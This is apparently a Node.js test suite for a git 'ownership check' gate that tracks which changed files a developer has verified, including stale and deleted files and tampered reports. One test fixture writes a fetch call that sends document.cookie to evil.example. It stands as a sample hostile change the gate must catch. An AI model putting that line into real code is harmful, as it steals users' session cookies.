// The ownership check end to end: status, save, verify, and what makes a report stale.

import assert from "node:assert/strict";
import { readFileSync, unlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { test } from "node:test";
import {
  commitAll,
  gate,
  git,
  payload,
  read,
  SUMMARY,
  saveAndCommit,
  setup,
  throwsGate,
  tmp,
  write,
} from "./helpers.mjs";

test("full flow: save, commit, verify, then stale, then recheck", (t) => {
  const { dev } = setup(t);
  write(dev, "src/app.js", "export const app = 2;\n");
  write(dev, "src/util.js", "export const util = 1;\n"); // untracked new file
  write(dev, "package-lock.json", '{"x": 1}\n'); // ignored by default

  let st = gate.status(dev);
  assert.deepEqual(Object.fromEntries(st.files.map((f) => [f.path, f.state])), {
    "package-lock.json": "new",
    "src/app.js": "new",
    "src/util.js": "new",
  });
  assert.deepEqual(
    st.files.filter((f) => f.ignored).map((f) => f.path),
    ["package-lock.json"],
  );
  assert.deepEqual(
    st.files.filter((f) => f.untracked).map((f) => f.path),
    ["src/util.js"],
  );

  throwsGate(() => gate.save({ summary: "did stuff", verified: { "src/app.js": ["x"] } }, dev), /summary/);
  throwsGate(() => gate.save({ summary: SUMMARY, verified: { "src/nope.js": ["x"] } }, dev), /Not part of this change/);
  throwsGate(() => gate.save({ summary: SUMMARY, verified: {} }, dev), /No verified files/);

  const msg = gate.save(payload({ "src/app.js": ["limit math"], "./src/util.js": "helper" }), dev);
  assert.ok(msg.includes(".learning/checks/feature%2Frate-limit.md"));

  assert.ok(gate.verify(dev)[0]); // verify judges commits; nothing committed yet

  git(dev, "add", "src", "package-lock.json");
  git(dev, "commit", "-qm", "rate limit (report forgotten)");
  let [passed, problems] = gate.verify(dev);
  assert.ok(!passed && problems[0].includes("No ownership report"));

  git(dev, "add", "-A");
  git(dev, "commit", "-qm", "add report");
  assert.ok(gate.verify(dev)[0]);

  // Code changes after the check -> stale
  write(dev, "src/app.js", "export const app = 3;\n");
  git(dev, "commit", "-qam", "tweak");
  [passed, problems] = gate.verify(dev);
  assert.ok(!passed && problems[0].includes("src/app.js") && problems[0].includes("differs from what was verified"));
  st = Object.fromEntries(gate.status(dev).files.map((f) => [f.path, f.state]));
  assert.deepEqual(st, { "package-lock.json": "ok", "src/app.js": "stale", "src/util.js": "ok" });

  throwsGate(() => gate.save(payload({ "src/util.js": ["helper"] }), dev), /src\/app.js/);
  gate.save(payload({ "src/app.js": ["new limit value"] }), dev);
  git(dev, "commit", "-qam", "recheck");
  assert.ok(gate.verify(dev)[0]);

  const report = gate.readReport(dev, "feature/rate-limit", "HEAD");
  assert.deepEqual(report.verified, { "src/app.js": ["new limit value"], "src/util.js": ["helper"] });
  const text = read(dev, ".learning/checks/feature%2Frate-limit.md");
  assert.ok(text.includes("## Verified understanding") && text.includes(SUMMARY));
});

test("a sensitive file must be verified explicitly", (t) => {
  const { dev } = setup(t);
  write(dev, "src/app.js", "export const app = 2;\n");
  write(dev, "src/auth/login.js", "export function login(u) { return u; }\n");
  throwsGate(() => gate.save(payload(), dev), /src\/auth\/login.js/);
  assert.ok(gate.status(dev).files.some((f) => f.sensitive));
  gate.save(payload({ "src/app.js": ["x"], "src/auth/login.js": ["token check"] }), dev);
  git(dev, "add", "-A");
  git(dev, "commit", "-qm", "auth");
  assert.ok(gate.verify(dev)[0]);
});

test("a change of only ignored files needs no report, and a deleted file is fingerprinted", (t) => {
  const { dev } = setup(t);
  write(dev, "package-lock.json", '{"only": "lock"}\n');
  const st = gate.status(dev);
  assert.deepEqual(
    st.files.map((f) => f.ignored),
    [true],
  );
  assert.deepEqual(st.must_verify, []);
  git(dev, "commit", "-qam", "lockfile only");
  assert.ok(gate.verify(dev)[0]); // ignored-only change: no report needed (e.g. dependency bots)
  unlinkSync(join(dev, "src/old.js"));
  gate.save(payload({ "src/old.js": ["why it was safe to remove"] }), dev);
  git(dev, "add", "-A");
  git(dev, "commit", "-qm", "remove old");
  assert.ok(gate.verify(dev)[0]);
  assert.ok("src/old.js" in gate.readReport(dev, "feature/rate-limit", "HEAD").files);
});

// status and save follow the same rule for files added after the first report.
test("status and save agree on files added after the report", (t) => {
  const { dev } = setup(t);
  write(dev, "src/app.js", "export const app = 2;\n");
  gate.save(payload(), dev);
  write(dev, "src/new.js", "new\n");
  const st = gate.status(dev);
  assert.deepEqual(st.must_verify, ["src/new.js"]);
  throwsGate(() => gate.save(payload({ "src/app.js": ["x"] }), dev), /src\/new.js/);
  gate.save(payload({ "src/new.js": ["what new does"] }), dev);
  assert.deepEqual(gate.status(dev).must_verify, []);
});

// The summary is measured in characters (code points), after trimming blank padding.
test("summary length counts characters, not UTF-16 units or exotic whitespace", (t) => {
  const { dev } = setup(t);
  // More than small_change_lines, so the full min_summary_chars (80) applies.
  write(dev, "src/app.js", Array.from({ length: 12 }, (_, i) => `export const app${i} = ${i};\n`).join(""));
  throwsGate(
    () => gate.save({ summary: "😀".repeat(40), verified: { "src/app.js": ["x"] } }, dev),
    /at least 80 characters/,
  );
  throwsGate(
    () => gate.save({ summary: "ok" + "\x1c".repeat(80), verified: { "src/app.js": ["x"] } }, dev),
    /at least 80 characters/,
  );
  gate.save({ summary: "😀".repeat(80), verified: { "src/app.js": ["x"] } }, dev);
});

// Deleting the report, or an outdated one, doesn't reset "changed since the last report".
for (const how of ["delete", "outdated"]) {
  test(`deleting or outdating the report doesn't reset the rules [${how}]`, (t) => {
    const { dev } = setup(t);
    write(dev, "src/app.js", "export const app = 2;\n");
    write(dev, "src/util.js", "util\n");
    saveAndCommit(dev, { "src/app.js": ["x"] });
    write(dev, "src/app.js", "export const app = 2;\nfetch('https://evil.example/?c=' + document.cookie);\n");
    const rel = join(dev, gate.reportRelpath("feature/rate-limit"));
    if (how === "delete") {
      unlinkSync(rel);
      commitAll(dev, "drop the report");
    } else {
      const version = gate.const("GATE_VERSION");
      writeFileSync(rel, readFileSync(rel, "utf8").replaceAll(`"version": ${version}`, '"version": 1'));
    }
    assert.ok(gate.status(dev).must_verify.includes("src/app.js"));
    throwsGate(() => gate.save(payload({ "src/util.js": ["trivial"] }), dev), /src\/app.js/);
  });
}

// Unborn branch gets an accurate message.
test("a repo with no commits gets a clear message", (t) => {
  const tmpPath = tmp(t);
  const repo = join(tmpPath, "r");
  git(tmpPath, "init", "-q", "-b", "main", repo);
  throwsGate(() => gate.status(repo), /no commits yet|base branch/);
});
